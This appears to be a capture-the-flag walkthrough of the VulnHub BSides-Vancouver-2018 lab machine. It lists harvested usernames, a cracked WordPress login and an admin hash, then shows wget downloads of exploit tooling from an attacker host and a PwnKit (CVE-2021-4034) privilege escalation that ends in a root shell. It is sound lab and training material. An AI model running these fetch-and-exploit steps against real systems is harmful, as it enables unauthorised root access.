```
joshua@kaligra:~/Documents/vulnhub/BSides-Vancouver-2018$ cat users.txt.bk
abatchy
john
mai
anne
doomguy

```

valid credentials:

```
[+] 10.0.2.21:80 - Success: 'john:enigma'
```


wordpress admin hash

```
admin:$P$BmuGRQyHFjh1FW29/KN6GvfYnwIl/O0
```

## Privesc

```
www-data@bsides2018:/tmp$ uname -ar
Linux bsides2018 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
```

## Linux-exploit-suggester

Transferred to target machine and executed:

```
$ wget http://10.0.2.8:8080/linux-exploit-suggester.sh
--2022-10-29 10:42:15--  http://10.0.2.8:8080/linux-exploit-suggester.sh
Connecting to 10.0.2.8:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 89274 (87K) [text/x-sh]
Saving to: `linux-exploit-suggester.sh'

     0K .......... .......... .......... .......... .......... 57% 11.3M 0s
    50K .......... .......... .......... .......              100% 9.20M=0.008s

2022-10-29 10:42:15 (10.3 MB/s) - `linux-exploit-suggester.sh' saved [89274/89274]

$ chmod +x linux-exploit-suggester.sh
$ ./linux-exploit-suggester.sh

```

Let's try with:

```
..
..
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
..
..


```

Copied exploit tar.gz to target:

```
$ cd /tmp
$ wget http://10.0.2.8:8080/CVE-2021-403.tar.gz
--2022-10-29 10:44:15--  http://10.0.2.8:8080/CVE-2021-403.tar.gz
Connecting to 10.0.2.8:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40683 (40K) [application/gzip]
Saving to: `CVE-2021-403.tar.gz'

     0K .......... .......... .......... .........            100% 9.84M=0.004s

2022-10-29 10:44:15 (9.84 MB/s) - `CVE-2021-403.tar.gz' saved [40683/40683]

$ tar xzvf CVE-2021-403.tar.gz
CVE-2021-4034/
CVE-2021-4034/README.md
CVE-2021-4034/dry-run/
..
..
CVE-2021-4034/LICENSE
CVE-2021-4034/cve-2021-4034.sh
CVE-2021-4034/.gitignore
$ cd CVE-2021-4034
```

"dry-run" looks promising:

```
www-data@bsides2018:/tmp/CVE-2021-4034$ cd dry-run
cd dry-run
www-data@bsides2018:/tmp/CVE-2021-4034/dry-run$ ls
ls
Makefile  dry-run-cve-2021-4034.c  pwnkit-dry-run.c
www-data@bsides2018:/tmp/CVE-2021-4034/dry-run$ make
make
cc -Wall -DTRUE='"/bin/true"' -DWHOAMI='"/usr/bin/whoami"' --shared -fPIC -o pwnkit-dry-run.so pwnkit-dry-run.c
echo "#ifndef __PWNKIT_SO_DATA_H"  >pwnkit-dry-run.so_data.h
echo "#define __PWNKIT_SO_DATA_H" >>pwnkit-dry-run.so_data.h
xxd -i pwnkit-dry-run.so                         >>pwnkit-dry-run.so_data.h
echo "#endif"                     >>pwnkit-dry-run.so_data.h
cc -Wall -DTRUE='"/bin/true"' -DWHOAMI='"/usr/bin/whoami"' -o dry-run-cve-2021-4034 dry-run-cve-2021-4034.c
rm pwnkit-dry-run.so
www-data@bsides2018:/tmp/CVE-2021-4034/dry-run$ ls
ls
Makefile               dry-run-cve-2021-4034.c  pwnkit-dry-run.so_data.h
dry-run-cve-2021-4034  pwnkit-dry-run.c
www-data@bsides2018:/tmp/CVE-2021-4034/dry-run$ ./dry-run-cve-2021-4034
./dry-run-cve-2021-4034
root
```

Got root:

```
www-data@bsides2018:/tmp/CVE-2021-4034$ make
make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
www-data@bsides2018:/tmp/CVE-2021-4034$ ls
ls
GCONV_PATH=.  README.md        cve-2021-4034.sh  pwnkit.c
LICENSE       cve-2021-4034    dry-run           pwnkit.so
Makefile      cve-2021-4034.c  gconv-modules
www-data@bsides2018:/tmp/CVE-2021-4034$ ./cve-2021-4034
./cve-2021-4034
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

```
# cd /root
cd /root
# ls
ls
flag.txt
```

